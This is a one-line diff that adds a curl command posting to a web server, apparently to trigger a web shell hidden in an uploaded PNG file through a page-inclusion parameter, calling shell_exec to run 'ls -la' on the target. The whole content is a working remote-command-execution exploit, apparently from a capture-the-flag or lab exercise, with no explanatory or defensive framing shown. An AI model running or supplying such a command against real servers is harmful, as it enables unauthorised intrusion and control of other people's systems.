@@ -1,0 +1,1 @@
+curl -XPOST 'https://webeasy1.nu-tech.xyz/?0=shell_exec&page=uploads/2ad1bf615ce5f41176e9bbe09ebaf08f24bef8bdd0bd6e357b670508b6cd67af.png' --output test -d '1=ls -la'
